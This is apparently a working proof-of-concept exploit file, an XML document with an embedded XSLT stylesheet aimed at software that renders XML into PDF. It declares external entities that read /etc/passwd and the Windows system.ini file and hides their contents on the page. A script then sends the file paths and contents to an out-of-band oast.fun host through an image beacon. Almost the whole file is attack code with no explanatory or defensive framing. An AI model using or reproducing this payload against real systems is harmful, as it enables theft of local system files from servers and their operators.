<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="?#"?>
<!DOCTYPE div [
  <!ENTITY passwd_p        "file:///etc/passwd">
  <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
  <!ENTITY sysini_p        "file:///c:/windows/system.ini">
  <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
]>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns="http://www.w3.org/1999/xhtml">

  <!-- Serialize as XML/XHTML and omit XML declaration in the result -->
  <xsl:output method="xml" omit-xml-declaration="yes" encoding="UTF-8"/>

  <xsl:template match="/">
    <!-- Keep your original approach: copy stylesheet node-set so entities are available -->
    <xsl:copy-of select="document('')"/>

    <html>
      <head>
        <meta charset="utf-8"/>
        <title>PDF Exfil Output</title>
        <style>
          html,body{margin:0;padding:0}
          #r { width:40rem; margin:1rem; font:12px/1.4 system-ui, sans-serif; }
          textarea { width:100%; font:12px/1.4 monospace; }
        </style>
      </head>
      <body>

        <!-- Hidden entity expansion targets -->
        <div style="display:none">
          <p class="&passwd_p;">&passwd_c;</p>
          <p class="&sysini_p;">&sysini_c;</p>
        </div>

        <!-- Visible proof area -->
        <div id="r"></div>

        <script><![CDATA[
          // ---- Demo-style visible proof ----
          const r = document.querySelector('#r');
          r.innerHTML = `
remote web url:
<textarea style="width:100%;height:1.5rem">${location.href}</textarea><br/><br/>`;

          // Build the exfil payload exactly like the demo (single shot)
          let exfilData = '';
          document.querySelectorAll('p').forEach(p => {
            const filePath = p.className;
            const fileContent = p.textContent; // use textContent to keep raw bytes
            // Render proof
            r.innerHTML += `
local file path:
<textarea style="width:100%;height:1.5rem">${filePath}</textarea><br/>
local file content:
<textarea style="width:100%;height:60rem">${fileContent}</textarea><br/><br/>`;
            // Collect for exfil
            exfilData += `Path: ${filePath}\nContent: ${fileContent}\n\n`;
          });

          // Send one beacon exactly as the demo showed
          const img = new Image();
          img.src = `https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/poc-exfil?data=${encodeURIComponent(exfilData)}`;
          document.body.appendChild(img);
        ]]></script>

      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
